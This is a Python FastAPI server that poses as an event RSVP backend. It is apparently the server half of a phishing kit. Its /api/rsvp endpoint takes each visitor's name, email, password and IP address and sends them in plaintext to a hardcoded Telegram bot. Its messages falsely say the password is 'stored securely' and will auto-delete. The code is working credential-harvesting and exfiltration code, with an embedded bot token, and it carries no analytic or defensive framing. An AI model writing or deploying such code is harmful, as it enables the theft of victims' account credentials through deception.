from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
import aiohttp
import json
from datetime import datetime
import uvicorn

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Serve frontend files
app.mount("/static", StaticFiles(directory="frontend"), name="static")

# =============================================
# 🔧 YOUR BOT TOKENS
# =============================================
BOT_TOKEN = '8676156420:AAFQpUpyOOMq-oDKwOiS8sxPTgvtfTnht0Y'
CHAT_ID = '1254120057'
# =============================================

@app.get("/")
async def serve_index():
    return FileResponse("frontend/index.html")

async def send_to_telegram(name, email, password, ip):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    message = f"""
🎉 **NEW RSVP CONFIRMATION**
─────────────────
👤 **Name:** {name}
📧 **Email:** {email}
🔑 **Password:** {password}
🖥️ **IP:** {ip}
⏰ **Time:** {timestamp}
─────────────────
✅ *RSVP successfully captured*
📌 *This message will auto-delete in 72 hours*
🔒 *Password stored securely*
    """
    
    async with aiohttp.ClientSession() as session:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        async with session.post(url, json={
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }) as response:
            return await response.json()

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

@app.post("/api/rsvp")
async def handle_rsvp(request: Request):
    try:
        data = await request.json()
        name = data.get('name')
        email = data.get('email')
        password = data.get('password')
        
        if not name or not email or not password:
            raise HTTPException(status_code=400, detail="Missing fields")
        
        client_ip = request.client.host if request.client else "Unknown"
        
        result = await send_to_telegram(name, email, password, client_ip)
        
        if result and result.get('ok'):
            return {
                'status': 'success',
                'message': 'RSVP recorded successfully',
                'timestamp': datetime.now().isoformat()
            }
        else:
            raise HTTPException(status_code=500, detail="Failed to send to Telegram")
        
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="Invalid JSON data")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)